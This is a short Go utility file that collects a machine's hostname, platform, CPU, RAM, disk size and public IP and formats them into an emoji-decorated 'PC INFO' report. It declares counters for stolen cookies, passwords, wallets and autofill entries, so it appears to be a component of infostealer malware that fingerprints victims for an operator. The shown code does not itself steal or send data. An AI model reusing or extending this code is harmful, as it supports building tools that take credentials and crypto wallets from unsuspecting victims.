package utils

import (
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

var (
	CookieAmount   = 0
	PasswordAmount = 0
	WalletAmount   = 0
	AutofillAmount = 0
)

type SysInfo struct {
	Hostname string
	Platform string
	CPU      string
	RAM      uint64
	Disk     uint64
}

var (
	hostStat, _ = host.Info()
	cpuStat, _  = cpu.Info()
	vmStat, _   = mem.VirtualMemory()
	diskStat, _ = disk.Usage("\\")
)

var Info = SysInfo{
	Hostname: hostStat.Hostname,
	Platform: hostStat.Platform,
	CPU:      cpuStat[0].ModelName,
	RAM:      vmStat.Total / 1024 / 1024,
	Disk:     diskStat.Total / 1024 / 1024,
}

func GetIP() string {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
		return "no info"
	}
	defer resp.Body.Close()
	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return "no info"
	}
	return string(ip)
}

var InfoStr = fmt.Sprintf("\n\n\xF0\x9F\x93\x8BPC INFO\xF0\x9F\x93\x8B\nIP: %s\nHostname: %s\nPlatform: %s\nCPU: %s\nRAM: %d\nDisk: %d", GetIP(), Info.Hostname, Info.Platform, Info.CPU, Info.RAM, Info.Disk)
